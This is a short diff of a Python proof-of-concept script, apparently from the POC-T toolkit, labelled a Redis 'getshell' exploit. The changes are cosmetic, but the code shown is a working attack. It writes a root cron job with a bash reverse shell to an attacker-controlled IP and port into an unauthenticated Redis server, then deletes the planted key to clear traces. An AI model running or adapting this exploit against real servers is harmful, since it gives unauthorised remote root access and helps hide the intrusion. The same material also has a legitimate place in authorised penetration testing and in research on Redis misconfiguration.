@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# author = i@cdxy.me
 # project = https://github.com/Xyntax/POC-T
+# author = i@cdxy.me
 
 """
 redis getshell expliot (/var/spool/cron reverse shell)
@@ -23,8 +23,7 @@ def poc(url):
     try:
         r = redis.Redis(host=ip, port=port, db=0, socket_timeout=10)
         if 'redis_version' in r.info():
-            payload = '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n'.format(ip=listen_ip,
-                                                                                             port=str(listen_port))
+            payload = '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n'.format(ip=listen_ip,port=str(listen_port))
             path = '/var/spool/cron'
             name = 'root'
             key = randomString(10)
@@ -35,7 +34,6 @@ def poc(url):
             r.delete(key)  # 清除痕迹
             r.config_set('dir', '/tmp')
             return True
-    except Exception, e:
-        # print e
+    except Exception:
         return False
     return False
